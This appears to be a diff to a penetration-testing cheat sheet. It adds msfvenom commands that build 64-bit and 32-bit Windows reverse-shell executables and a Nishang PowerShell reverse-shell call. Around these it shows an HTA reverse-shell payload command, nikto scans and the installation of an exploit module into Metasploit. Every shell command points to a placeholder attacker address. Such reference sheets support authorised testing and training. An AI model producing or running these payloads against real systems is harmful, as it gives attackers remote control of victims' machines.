@@ -1669,8 +1669,11 @@ cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/pa
 # list available payloads
 msfvenom --list payloads
 
-# create Windows TCP reverse shell exe
+# create Windows TCP reverse shell exe - 64-bit
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
+
+# create Windows TCP reverse shell exe - 32-bit
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe
 
 # create Windows TCP reverse shell hta
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-psh -o revshell.hta
@@ -1947,6 +1950,14 @@ nikto -h host_site_here
 
 # scan host / site with authentication
 nikto -h host_site_here -i user_here:password_here
+```
+
+
+
+## NISHANG
+```powershell
+# prepare Nishang reverse shell
+Invoke-PowerShellTcp -Reverse -IPAddress IP_here -Port port_here
 ```
 
 
